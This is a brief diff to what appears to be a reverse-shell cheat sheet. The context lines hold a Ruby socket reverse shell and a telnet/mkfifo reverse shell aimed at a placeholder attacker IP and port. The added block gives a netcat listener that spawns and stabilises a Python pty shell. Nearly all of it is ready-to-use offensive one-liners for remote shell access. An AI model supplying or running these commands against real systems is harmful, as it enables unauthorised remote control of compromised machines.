@@ -40,3 +40,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<local_ip>","<port>");while(cmd=
 # telnet
 
 TF=$(mktemp -u); mkfifo $TF && telnet <local_ip> <port> 0<$TF | <shell> 1>$TF
+
+# stabilized fancy beefy gordita crunch shell
+
+stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"<shell>\")" || python -c "import pty;pty.spawn(\"<shell>\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset; echo id;cat) | nc -lvnp <port> && reset
